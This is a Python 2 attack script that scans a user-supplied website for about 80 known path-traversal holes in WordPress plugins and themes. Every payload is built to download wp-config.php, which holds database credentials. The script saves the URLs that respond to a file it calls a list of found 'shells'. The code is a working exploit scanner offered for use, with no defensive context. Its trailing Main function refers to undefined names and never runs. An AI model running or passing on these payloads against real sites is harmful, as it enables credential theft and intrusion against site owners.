#!/usr/bin/python
import os
import httplib
from httplib import HTTPConnection
import urllib2
import socket
from socket import timeout as SocketTimeout

def banner():
    print '''
__        ______    ____  __  __ _____ ____
\ \      / /  _ \  / ___||  \/  |_   _|  _ 
 \ \ /\ / /| |_) | \___ \| |\/| | | | | |_) |
  \ V  V / |  __/   ___) | |  | | | | |  __/
   \_/\_/  |_|     |____/|_|  |_| |_| |_|
   '''


def clearing():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


banner()
website = raw_input('[+] Put Your Fucking List [+] :~# ')
shells = [
    '/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php',
    '/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=',
    '/wp-content/themes/epic/includes/download.php?file=../../../../wp-config.php',
    '/wp-content/plugins/recent-backups/download-file.php?file_link=../../../wp-config.php',
    '/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php',
    '/wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=../../../../wp-config.php',
    '/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=../../../wp-config.php',
    '/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php',
    '/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php',
    '/wp-content/force-download.php?file=../wp-config.php',
    '/wp-content/blog/secondaryphase/mdocs-posts/?mdocs-img-preview=../../../../wp-config.php',
    '/wp-admin/blog/admin-ajax.php?action=revslider_show_image&img=../../wp-config.php',
    '/mdocs-posts/?mdocs-img-preview=../wp-config.php',
    '/blog/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
    '/force-download.php?file=wp-config.php',
    '/wp-content/plugins/dukapress/lib/dp_image.php?src=../../../../wp-config.php',
    '/wp-content/plugins/plugin-newsletter/preview.php?data=../../../wp-config.php',
    '/wp-content/plugins/simple-download-button-shortcode/simple-download-button_dl.php?file=../../../wp-config.php',
    '/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php',
    '/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10',
    '/wp-content/plugins/wp-source-control/downloadfiles/download.php?path=../../../../wp-config.php',
    '/wp-content/plugins/bookx/includes/bookx_export.php?file=../../../../wp-config.php',
    '/wp-content/plugins/advanced-dewplayer/admin-panel/download-file.php?dew_file=../../../../wp-config.php',
    '/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php',
    '/wp-content/plugins/simple-image-manipulator/controller/download.php?filepath=../../../../wp-config.php',
    '/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=../../../../wp-config.php',
    '/wp-content/plugins/ibs-mappro/lib/download.php?file=../../../../wp-config.php',
    '/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=../../../../../wp-config.php',
    '/wp-content/plugins/filedownload/download.php/?path=../../../wp-config.php',
    '/wp-content/plugins/pica-photo-gallery/picadownload.php?imgname=../../../wp-config.php',
    '/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php',
    '/wp-content/plugins/harma-booking/frontend/ajax/gateways/proccess.php?gateway=../../../../../../wp-config.php',
    '/wp-content/plugins/mdocs-posts/?mdocs-img-preview=../../../wp-config.php',
    '/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php',
    '/wp-content/plugins/image-export/download.php?file=../../../wp-config.php',
    '/wp-content/plugins/advanced-uploader/upload.php?destinations=../../../wp-config.php',
    '/wp-content/plugins/sell-downloads/sell-downloads.php?file=./../../../wp-config.php',
    '/wp-content/plugins/thecartpress/modules/Miranda.class.php?page=../../../../wp-config.php',
    '/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?name=wp-config.php&path=../../../../../../../wp-config.php',
    '/wp-content/plugins/robotcpa/f.php?l=cGhwOi8vZmlsdGVyL3Jlc291cmNlPS4vLi4vLi4vLi4vd3AtY29uZmlnLnBocA==',
    '/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php',
    '/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php',
    '/wp-content/plugins/cloudsafe365-for-wp/admin/editor/cs365_edit.php?file=../../../../../wp-config.php',
    '/wp-content/plugins/mailz/lists/config/config.php?wpabspath=../../../../../wp-config.php',
    '/wp-content/plugins/disclosure-policy-plugin/functions/action.php?delete=asdf&blogUrl=asdf&abspath=../../../../wp-config.php',
    '/wp-content/plugins/accept-signups/accept-signups_submit.php?file=../../../wp-config.php',
    '/wp-content/plugins/wp-filemanager/incl/libfile.php?path=&filename=../../../../wp-config.php&action=download',
    '/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?path=../../../../../../../wp-config.php',
    '/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php',
    '/wp-content/plugins/wp-swimteam/include/user/download.php?file=../../../wp-config.php&filename=../../../wp-config.php&contenttype=text/html&transient=1',
    '/wp-content/plugins/thecartpress/modules/Miranda.class.php?page=../../../../wp-config.php%00',
    '/wp-content/plugins/rb-agency/ext/forcedownload.php?file=../../../../wp-config.php',
    '/wp-content/plugins/paypal-currency-converter-basic-for-woocommerce/proxy.php?requrl=../../../wp-config.php',
    '/wp-content/plugins/document_manager/views/file_download.php?fname=../../../../wp-config.php',
    '/wp-content/plugins/cip4-folder-download-widget/cip4-download.php?target=wp-config.php&info=wp-config.php',
    '/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../wp-config.php',
    '/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php',
    '/wp-content/plugins/advanced-uploader/upload.php?destinations=../../../wp-config.php%00',
    '/wp-content/plugins/abtest/abtest_admin.php?action=../../../wp-config.php',
    '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php',
    '/wp-content/themes/Newspapertimes_1/download.php?filename=../../../wp-config.php',
    '/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php',
    '/wp-content/themes/corporate_works/downloader.php?file_download=../../wp-config.php',
    '/wp-content/themes/parallelus-mingle/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php',
    '/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php',
    '/wp-content/themes/tess/download.php?file=../../../wp-config.php',
    '/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php',
    '/wp-content/themes/yakimabait/download.php?file=../../../wp-config.php',
    '/wp-content/themes/ypo-theme/download.php?download=../../../../wp-config.php',
    '/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php',
    '/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php',
    '/wp-content/themes/acento/includes/view-pdf.php?download=1&file=../../../../wp-config.php',
    '/wp-content/themes/ypo-theme/download.php?download=..%2F..%2F..%2F..%2Fwp-config.php',
    '/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php',
    '/wp-content/themes/lote27/download.php?download=../../../wp-config.php',
    '/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php',
    '/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php',
    '/wp-content/themes/SMWF/inc/download.php?file=../../../../wp-config.php',
    '/wp-content/themes/persuasion/lib/scripts/dl-skin.php',
    '/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php',
    '/wp-content/themes/FR0_theme/down.php?path=../../../wp-config.php']


foundshells = []

for shell in shells:
    site = website.replace('http://', '')
    host = site + shell
    conn = httplib.HTTPConnection(site)
    conn.connect()
    request = conn.request('GET', shell)
    response = conn.getresponse()
    if response.status == 200:
        print '\n\t' +'[+] Shells => Found %s \n' % host
        foundshells.append(host)
    else:
        print '[-] Not Found %s ' % host
fpth = os.getcwd()
fpth2 = fpth + '/Founder.txt'
fob = open(fpth2, 'w')
fob.close()
fob = open(fpth2, 'a')
fob.writelines(foundshells)
print 'Found Shells Saved On Founder.txt'
raw_input('\n Press eter To Aborted ... ')
exit()

def Main():
    try:
        
        start = timer()
        ThreadPool = Pool(20)
        Threads = ThreadPool.map(bypass, ooo)
        print('Time: ' + str(timer() - start) + ' seconds')
    except BaseException:
        pass


if __name__ == '__main__':
    Main()
